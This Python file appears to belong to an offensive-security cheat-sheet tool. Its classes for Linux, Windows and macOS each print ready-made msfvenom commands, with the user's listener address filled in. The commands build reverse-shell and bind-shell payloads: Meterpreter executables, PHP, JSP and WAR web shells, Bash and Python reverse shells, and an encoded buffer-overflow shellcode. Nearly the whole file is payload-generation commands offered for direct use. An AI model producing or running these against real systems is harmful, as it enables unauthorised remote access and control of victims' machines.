from core.core import *
class msfvenom_linux:
	def __init__(self,lport='9001',lhost=''):
		self.lhost=lhost
		self.lport=lport

	def get(self):
		return f'''
{TerminalColor.Orange}#LINUX METERPRETER STAGED REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan}-f elf -o reverse.elf{TerminalColor.Reset}

{TerminalColor.Orange}#LINUX STAGELESS REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p linux/x64/shell_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f elf -o reverse.elf{TerminalColor.Reset}

{TerminalColor.Orange}#LINUX METERPRETER STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p php/meterpreter_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f raw -o shell.php{TerminalColor.Reset}

{TerminalColor.Orange}#PHP REVERSE PHP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p php/reverse_php LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -o shell.php{TerminalColor.Reset}

{TerminalColor.Orange}#JSP STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p java/jsp_shell_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f raw -o shell.jsp{TerminalColor.Reset}

{TerminalColor.Orange}#WAR STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p java/shell_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f war -o shell.war{TerminalColor.Reset}

{TerminalColor.Orange}#PYTHON STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p cmd/unix/reverse_python LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f raw{TerminalColor.Reset}

{TerminalColor.Orange}#BASH STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p cmd/unix/reverse_bash LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f raw -o shell.sh{TerminalColor.Reset}

		'''

class msfvenom_windows:
	def __init__(self,lport='9001',lhost=''):
		self.lhost=lhost
		self.lport=lport

	def get(self):
		return f'''
{TerminalColor.Orange}#WINDOWS METERPRETER  STAGED REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f exe -o reverse.exe{TerminalColor.Reset}

{TerminalColor.Orange}#WINDOWS METERPRETER STAGELESS REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f exe -o reverse.exe{TerminalColor.Reset}

{TerminalColor.Orange}#WINDOWS STAGED REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p windows/x64/shell/reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f exe -o reverse.exe{TerminalColor.Reset}

{TerminalColor.Orange}#WINDOWS STAGELESS REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p windows/x64/shell_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f exe -o reverse.exe{TerminalColor.Reset}

{TerminalColor.Orange}#WINDOWS STAGED JSP REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f jsp -o ./rev.jsp{TerminalColor.Reset}

{TerminalColor.Orange}#WINDOWS BIND TCP SHELL CODE - BOF{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode{TerminalColor.Reset}

{TerminalColor.Orange}#PHP METERPRETER STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p php/meterpreter_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f raw -o shell.php{TerminalColor.Reset}

{TerminalColor.Orange}#PHP REVERSE PHP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p php/reverse_php LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -o shell.php{TerminalColor.Reset}

{TerminalColor.Orange}#JSP STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p java/jsp_shell_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f raw -o shell.jsp{TerminalColor.Reset}

{TerminalColor.Orange}#WAR STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p java/shell_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f war -o shell.war{TerminalColor.Reset}

{TerminalColor.Orange}#PYTHON STAGELESS REVERSE TCP{TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p cmd/unix/reverse_python LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f raw{TerminalColor.Reset}

		'''

class msfvenom_mac:
	def __init__(self,lport='9001',lhost=''):
		self.lhost=lhost
		self.lport=lport

	def get(self):
		return f'''
{TerminalColor.Orange}#MacOS METERPRETER  STAGED REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f macho -o shell.macho{TerminalColor.Reset}

{TerminalColor.Orange}#MacOS METERPRETER STAGELESS REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f macho -o shell.macho{TerminalColor.Reset}

{TerminalColor.Orange}#MacOS STAGELESS REVERSE TCP (x64){TerminalColor.Reset}
{TerminalColor.Cyan}msfvenom -p osx/x64/shell_reverse_tcp LHOST={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} LPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -f macho -o shell.macho{TerminalColor.Reset}

		'''







